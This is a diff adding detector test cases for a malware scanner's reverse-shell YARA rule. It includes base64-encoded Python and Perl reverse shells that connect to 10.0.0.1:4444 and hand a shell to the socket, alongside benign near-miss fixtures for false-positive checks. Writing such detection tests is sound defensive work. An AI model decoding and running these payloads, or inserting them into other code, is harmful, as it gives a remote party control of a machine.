@@ -201,6 +201,115 @@ def _perl_stdin_reopen_no_exec_fixture() -> str:
     ).decode()
 
 
+def _python_dup2_execl_reverse_shell_fixture() -> str:
+    """A dup2-based Python reverse shell ending in ``os.execl``, not ``execve``.
+
+    The prior fix's exec alternation only recognized ``execve``, so this
+    equally real ``os.execl("/bin/sh", "sh", "-i")`` form went undetected.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
+        "Y2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0NDQ0KSkKb3MuZHVw"
+        "MihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9zLmR1cDIocy5maWxl"
+        "bm8oKSwgMikKb3MuZXhlY2woIi9iaW4vc2giLCAic2giLCAiLWkiKQo="
+    ).decode()
+
+
+def _python_dup2_pty_spawn_reverse_shell_fixture() -> str:
+    """A dup2-based Python reverse shell ending in ``pty.spawn([...])``.
+
+    ``pty.spawn`` is commonly called with a list argument, the same as
+    ``subprocess.call``/``Popen``/``run``, but the prior fix's alternation
+    only allowed the optional ``[`` bracket on the ``subprocess.*`` branch.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHB0eQpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F"
+        "VCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQpKQpv"
+        "cy5kdXAyKHMuZmlsZW5vKCksIDApCm9zLmR1cDIocy5maWxlbm8oKSwgMSkKb3MuZHVwMihz"
+        "LmZpbGVubygpLCAyKQpwdHkuc3Bhd24oWyIvYmluL3NoIiwgIi1pIl0pCg=="
+    ).decode()
+
+
+def _python_fileno_kwarg_reverse_shell_fixture() -> str:
+    """A Python reverse shell that redirects via ``stdin=``/``stdout=``/
+    ``stderr=`` keyword arguments to ``subprocess.call`` instead of ``os.dup2``.
+
+    Both forms wire the socket's descriptor onto the child's standard
+    streams; requiring ``dup2(`` unconditionally missed this equally valid
+    and commonly used form.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZf"
+        "SU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMC4wLjAuMSIsIDQ0NDQp"
+        "KQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1pIl0sIHN0ZGluPXMuZmlsZW5vKCks"
+        "IHN0ZG91dD1zLmZpbGVubygpLCBzdGRlcnI9cy5maWxlbm8oKSkK"
+    ).decode()
+
+
+def _python_dup2_nonshell_helper_fixture() -> str:
+    """``os.dup2`` onto stdin followed by a non-shell helper whose name has
+    ``sh`` as a mere prefix (``sha256sum``), not a shell executable.
+
+    The shell-name alternatives had no boundary after ``sh``, so ``\\w*sh``
+    matched the leading two characters of ``sha256sum`` and misclassified
+    this as a CRITICAL ``reverse_shell``/YR1 finding.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpzdWJwcm9jZXNzLnJ1bihbInNoYTI1NnN1"
+        "bSJdKQo="
+    ).decode()
+
+
+def _python_dup2_unrelated_local_logging_fixture() -> str:
+    """A client that closes its socket, then redirects an unrelated log file's
+    descriptor onto stdout (``fd`` 1, never ``fd`` 0/stdin) before running a
+    shell for local housekeeping.
+
+    Requiring any ``dup2(`` accepted this local-logging redirection as
+    corroborating evidence even though the socket itself is never wired to
+    the shell's stdin — no remote command channel exists. Binding the
+    ``dup2`` evidence to descriptor 0 (stdin) excludes this.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCwgb3MsIHN1YnByb2Nlc3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0"
+        "LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0"
+        "NDQ0KSkKcy5zZW5kKGIiaGVhbHRoIGNoZWNrIikKcy5jbG9zZSgpCmxvZyA9IG9wZW4oIm91"
+        "dHB1dC5sb2ciLCAiYSIpCm9zLmR1cDIobG9nLmZpbGVubygpLCAxKQpzdWJwcm9jZXNzLnJ1"
+        "bihbIi9iaW4vc2giLCAiLWMiLCAiZGF0ZSJdKQo="
+    ).decode()
+
+
+def _multiline_perl_socket_reverse_shell_no_parens_fixture() -> str:
+    """A multiline Perl reverse shell using the parenthesis-free forms of
+    ``open`` and ``exec``, both valid Perl syntax.
+
+    Requiring parentheses around both calls missed this equally real form.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbiBTVERJTiwgIjwmU09DS0VUIjsKb3BlbiBTVERPVVQs"
+        "ICI+JlNPQ0tFVCI7Cm9wZW4gU1RERVJSLCAiPiZTT0NLRVQiOwpleGVjICIvYmluL3NoIiwg"
+        "Ii1pIjsK"
+    ).decode()
+
+
+def _perl_helper_exec_nonshell_prefix_fixture() -> str:
+    """Redirects STDIN onto the socket, then ``exec``s ``sha256sum`` — a
+    non-shell helper whose name merely has ``sh`` as a prefix.
+
+    Mirrors `_python_dup2_nonshell_helper_fixture`'s boundary gap for Perl.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
+        "b3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwg"
+        "aW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwmU09DS0VUIik7CmV4ZWMoInNoYTI1"
+        "NnN1bSIpOwo="
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -815,6 +924,90 @@ class TestBuiltInMalwarePackaging:
         findings = _run_builtin(
             _perl_stdin_reopen_no_exec_fixture(),
             "scripts/stdin_reader.pl",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_dup2_execl_python_shell(self):
+        """``os.execl`` must be recognized alongside ``os.execve`` as a
+        dup2-preceded shell-exec marker. See
+        `_python_dup2_execl_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_dup2_execl_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_matches_dup2_pty_spawn_list_python_shell(self):
+        """``pty.spawn([...])`` with a list argument must match, the same as
+        ``subprocess.call``/``Popen``/``run``. See
+        `_python_dup2_pty_spawn_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_dup2_pty_spawn_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_matches_fileno_kwarg_python_shell(self):
+        """``stdin=``/``stdout=``/``stderr=`` keyword redirection to
+        ``subprocess.call`` is equivalent evidence to ``os.dup2`` and must
+        also match. See `_python_fileno_kwarg_reverse_shell_fixture`.
+        """
+        findings = _run_builtin(
+            _python_fileno_kwarg_reverse_shell_fixture(),
+            "scripts/backdoor.py",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_does_not_match_python_dup2_nonshell_helper_with_sh_prefix(self):
+        """A non-shell helper whose name merely starts with ``sh`` (e.g.
+        ``sha256sum``) must NOT satisfy the shell-execution marker. See
+        `_python_dup2_nonshell_helper_fixture`: this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_dup2_nonshell_helper_fixture(),
+            "scripts/report.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_does_not_match_python_dup2_unrelated_local_logging(self):
+        """``os.dup2`` onto an unrelated log file's descriptor (stdout, never
+        stdin) after the socket has already closed must NOT satisfy the
+        descriptor-redirection marker — the socket is never wired to the
+        shell's stdin. See `_python_dup2_unrelated_local_logging_fixture`:
+        this must NOT match.
+        """
+        findings = _run_builtin(
+            _python_dup2_unrelated_local_logging_fixture(),
+            "scripts/housekeeping.py",
+        )
+        assert not _has_rule(findings, "reverse_shell")
+
+    def test_reverse_shell_rule_matches_multiline_perl_socket_without_parens(self):
+        """Perl's parenthesis-free ``open``/``exec`` forms are valid syntax
+        and must match the same as the parenthesized forms. See
+        `_multiline_perl_socket_reverse_shell_no_parens_fixture`.
+        """
+        findings = _run_builtin(
+            _multiline_perl_socket_reverse_shell_no_parens_fixture(),
+            "scripts/backdoor.pl",
+        )
+        assert _has_rule(findings, "reverse_shell")
+        assert any(f.rule_id == "YR1" for f in findings)
+
+    def test_reverse_shell_rule_does_not_match_perl_helper_exec_with_sh_prefix(self):
+        """A non-shell helper whose name merely starts with ``sh`` (e.g.
+        ``sha256sum``) must NOT satisfy `$perl_socket`'s shell-execution
+        marker. See `_perl_helper_exec_nonshell_prefix_fixture`: this must
+        NOT match.
+        """
+        findings = _run_builtin(
+            _perl_helper_exec_nonshell_prefix_fixture(),
+            "scripts/report.pl",
         )
         assert not _has_rule(findings, "reverse_shell")
 
